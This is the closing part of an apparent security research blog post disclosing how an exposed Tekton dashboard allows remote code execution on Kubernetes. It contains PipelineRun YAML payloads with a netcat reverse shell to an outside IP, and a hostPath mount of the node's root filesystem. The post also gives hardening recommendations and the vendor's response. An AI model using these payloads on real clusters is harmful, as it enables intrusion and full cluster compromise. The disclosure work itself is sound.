+<p><img src="import1.png" alt=""></p>
+<p><img src="import2.png" alt=""></p>
+<p>If we click through and fill in some dummy data we can generate the following request:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /apis/tekton.dev/v1/namespaces/tekton-dashboard/pipelineruns/ <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">127.0.0.1:9097</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/json</span>
+</span></span><span style="display:flex;"><span>Tekton-Client<span style="color:#f92672">:</span> <span style="color:#ae81ff">tektoncd/dashboard</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">...</span>
+</span></span></code></pre></div><p>Judging by its request line, this request likely creates a PipelineRun resource so let&rsquo;s explore what that could mean.</p>
+<p>Because the path starts with <code>/apis/</code> we know we are dealing with a <a href="https://kubernetes.io/docs/reference/using-api/#api-groups">named API group</a>. As <code>tekton.dev</code> is not a built-in group we are dealing with either an <a href="https://kubernetes.io/docs/concepts/extend-kubernetes/api-extension/apiserver-aggregation/">aggregated API server</a> or, more commonly a <a href="https://kubernetes.io/docs/tasks/extend-kubernetes/custom-resources/custom-resource-definitions/">custom resource definition (CRD)</a>. We can find the CRD in the <a href="https://github.com/tektoncd/pipeline/blob/main/config/300-crds/300-pipelinerun.yaml">pipeline repo</a>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">apiextensions.k8s.io/v1</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">CustomResourceDefinition</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">pipelineruns.tekton.dev</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">labels</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">app.kubernetes.io/instance</span>: <span style="color:#ae81ff">default</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">app.kubernetes.io/part-of</span>: <span style="color:#ae81ff">tekton-pipelines</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">pipeline.tekton.dev/release</span>: <span style="color:#e6db74">&#34;devel&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">version</span>: <span style="color:#e6db74">&#34;devel&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">spec</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">group</span>: <span style="color:#ae81ff">tekton.dev</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">preserveUnknownFields</span>: <span style="color:#66d9ef">false</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">versions</span>:
+</span></span><span style="display:flex;"><span>  - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">v1beta1</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">served</span>: <span style="color:#66d9ef">true</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">storage</span>: <span style="color:#66d9ef">false</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">schema</span>:
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">openAPIV3Schema</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">type</span>: <span style="color:#ae81ff">object</span>
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Custom resource creation requests are validated according to the OpenAPI v3 schema included in their definition. In this case however it does not provide further insights as it only expects a valid JSON object. Luckily, the repository contained some <a href="https://github.com/tektoncd/pipeline/blob/main/docs/developers/controller-logic.md">documentation</a> indicating that every CRD has a matching go struct at <code>pkg/apis/pipeline/v1/</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// PipelineRunSpec defines the desired state of PipelineRun
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">type</span> <span style="color:#a6e22e">PipelineRunSpec</span> <span style="color:#66d9ef">struct</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// +optional
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">PipelineRef</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">PipelineRef</span> <span style="color:#e6db74">`json:&#34;pipelineRef,omitempty&#34;`</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Specifying PipelineSpec can be disabled by setting
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// `disable-inline-spec` feature flag..
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// +optional
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">PipelineSpec</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">PipelineSpec</span> <span style="color:#e6db74">`json:&#34;pipelineSpec,omitempty&#34;`</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Params is a list of parameter names and values.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// +listType=atomic
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">Params</span> <span style="color:#a6e22e">Params</span> <span style="color:#e6db74">`json:&#34;params,omitempty&#34;`</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Used for cancelling a pipelinerun (and maybe more later on)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// +optional
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">Status</span> <span style="color:#a6e22e">PipelineRunSpecStatus</span> <span style="color:#e6db74">`json:&#34;status,omitempty&#34;`</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Time after which the Pipeline times out.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// Currently three keys are accepted in the map
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// pipeline, tasks and finally
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// with Timeouts.pipeline &gt;= Timeouts.tasks + Timeouts.finally
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// +optional
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">Timeouts</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">TimeoutFields</span> <span style="color:#e6db74">`json:&#34;timeouts,omitempty&#34;`</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// TaskRunTemplate represent template of taskrun
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// +optional
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">TaskRunTemplate</span> <span style="color:#a6e22e">PipelineTaskRunTemplate</span> <span style="color:#e6db74">`json:&#34;taskRunTemplate,omitempty&#34;`</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Workspaces holds a set of workspace bindings that must match names
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// with those declared in the pipeline.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// +optional
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// +listType=atomic
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">Workspaces</span> []<span style="color:#a6e22e">WorkspaceBinding</span> <span style="color:#e6db74">`json:&#34;workspaces,omitempty&#34;`</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// TaskRunSpecs holds a set of runtime specs
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// +optional
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// +listType=atomic
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">TaskRunSpecs</span> []<span style="color:#a6e22e">PipelineTaskRunSpec</span> <span style="color:#e6db74">`json:&#34;taskRunSpecs,omitempty&#34;`</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span></code></pre></div><p>A <a href="https://kubernetes.io/docs/concepts/architecture/controller/">controller</a> in Kubernetes monitors resources it is interested in and it &ldquo;reconciles&rdquo; in response to relevant events. That means it changes the clusters state to match the desired state. In this example that could mean creating a specific pod whenever a new PipelineRun is requested. Another controller, the kube-scheduler, notices the requirement of a new pod and goes on to schedule it to a node.</p>
+<p>Therefore, to understand the PipelineRun resource, we have to check its reconciler implementation at <code>pkg/reconciler/pipelinerun/pipelinerun.go</code>.</p>
+<p>Before diving into the code I wanted to take a break and play around with the functionality first. While doing so I noticed the &ldquo;Edit and run&rdquo; button of my existing PipelineRun. It presented a nicely readable and editable YAML file containing the definition of my PipelineRun resource:</p>
+<p><img src="yamlEdit.png" alt=""></p>
+<p>Obviously the <code>script</code> key spiked my interest and it was indeed possible to leverage it to execute arbitrary commands so I went for a shell with:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">script</span>: &gt;<span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  #!/usr/bin/env sh
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  busybox nc 192.168.58.1 8000 -e /bin/sh</span>  
+</span></span></code></pre></div><p>RCE is nice, but I thought this looks a lot like a normal pod definition, can it do anything malicious like mounting the node&rsquo;s file system?</p>
+<p>I tried to get a minimal PipelineRun by repeatedly removing potentially unimportant lines until it breaks, which finally led me to:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">tekton.dev/v1</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">PipelineRun</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">generateName</span>: <span style="color:#ae81ff">import-resources-1727367416567-2nr95-r-</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">namespace</span>: <span style="color:#ae81ff">tekton-dashboard</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">spec</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">pipelineSpec</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">tasks</span>:
+</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">fetch-repo</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">taskSpec</span>:
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">metadata</span>: {}
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">spec</span>: <span style="color:#66d9ef">null</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">steps</span>:
+</span></span><span style="display:flex;"><span>            - <span style="color:#f92672">computeResources</span>: {}
+</span></span><span style="display:flex;"><span>              <span style="color:#f92672">image</span>: <span style="color:#ae81ff">busybox:latest</span>
+</span></span><span style="display:flex;"><span>              <span style="color:#f92672">name</span>: <span style="color:#ae81ff">clone</span>
+</span></span><span style="display:flex;"><span>              <span style="color:#f92672">script</span>: |<span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                #!/usr/bin/env sh 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                busybox nc 192.168.49.1 8000 -e /bin/sh</span>                
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">taskRunTemplate</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">serviceAccountName</span>: <span style="color:#ae81ff">default</span>
+</span></span></code></pre></div><p>Pretending this is just a pod we could mount the host&rsquo;s file system with:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">tekton.dev/v1</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">PipelineRun</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">generateName</span>: <span style="color:#ae81ff">import-resources-1727367416567-2nr95-r-</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">namespace</span>: <span style="color:#ae81ff">tekton-dashboard</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">spec</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">pipelineSpec</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">tasks</span>:
+</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">fetch-repo</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">taskSpec</span>:
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">metadata</span>: {}
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">spec</span>: <span style="color:#66d9ef">null</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">steps</span>:
+</span></span><span style="display:flex;"><span>            - <span style="color:#f92672">computeResources</span>: {}
+</span></span><span style="display:flex;"><span>              <span style="color:#f92672">image</span>: <span style="color:#ae81ff">busybox:latest</span>
+</span></span><span style="display:flex;"><span>              <span style="color:#f92672">name</span>: <span style="color:#ae81ff">clone</span>
+</span></span><span style="display:flex;"><span>              <span style="color:#f92672">script</span>: |<span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                #!/usr/bin/env sh 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                busybox nc 192.168.49.1 8000 -e /bin/sh</span>                
+</span></span><span style="display:flex;"><span>              <span style="color:#f92672">volumeMounts</span>:
+</span></span><span style="display:flex;"><span>                - <span style="color:#f92672">mountPath</span>: <span style="color:#ae81ff">/var/noderoot</span>
+</span></span><span style="display:flex;"><span>                  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">noderoot</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">volumes</span>:
+</span></span><span style="display:flex;"><span>            - <span style="color:#f92672">hostPath</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">path</span>: <span style="color:#ae81ff">/</span>
+</span></span><span style="display:flex;"><span>              <span style="color:#f92672">name</span>: <span style="color:#ae81ff">noderoot</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">taskRunTemplate</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">serviceAccountName</span>: <span style="color:#ae81ff">default</span>
+</span></span></code></pre></div><p>And indeed it was possible to access the nodes file system, which is usually enough to compromise the whole cluster:</p>
+<p><img src="rce.png" alt=""></p>
+<p>Interestingly, this is only possible in the <code>tekton-dashboard</code> namespace (and every other non-secured namespace). Both the <code>tekton-pipelines</code> and the <code>tekton-pipelines-resolvers</code> namespaces have the <a href="https://kubernetes.io/docs/concepts/security/pod-security-standards/">pod security standards</a> profile <code>Restricted</code> applied:</p>
+<p><img src="podsecurity.png" alt=""></p>
+<h3 id="summary">Summary</h3>
+<p>A internet exposed Tekton dashboard allows direct access to the Kubernetes API. This access is pre-authenticated with the privileges of the <code>tekton-dashboard</code> service account which, regardless of the deployment mode, allows access to pod definitions and container stdout by default. It is also possible to provide your own credentials for the Kubernetes API and if the dashboard is deployed in <code>read/write</code> mode it enables remote code execution.</p>
+<h3 id="recommendation">Recommendation</h3>
+<ul>
+<li>Do not expose your dashboard to the internet. If needed, require prior authentication as described <a href="https://github.com/tektoncd/dashboard/blob/main/docs/install.md#access-control">here</a>.</li>
+<li>Deploy your dashboard in <code>read-only</code> mode.</li>
+<li>Limit the privileges of the <code>tekton-dashboard</code> service account.</li>
+<li>Configure pod security standards for the whole cluster.</li>
+</ul>
+<h3 id="vendor-reaction">Vendor Reaction</h3>
+<p>The issue was communicated to the Tekton security team in July 2024. They came to the conclusion that the issue lies primarily in the documentation, because the tutorial did not mention the different modes and the installation defaulted to <code>read/write</code>.</p>
+<p>A GitHub security advisory was opened, the documentation improved and the default mode was changed to <code>read-only</code>. Other than that they referred to current cluster administration best practices.</p>
+<p>There are no additional warnings or changes for the central <a href="https://github.com/tektoncd/pipeline">pipelines repo</a>.</p>
+</div></article>
+<footer class="py:24">
+    <div class="f:fade-30 f:14 mb:8"></div>
+</footer></div>
+    </div>
+</body>
+
+</html>
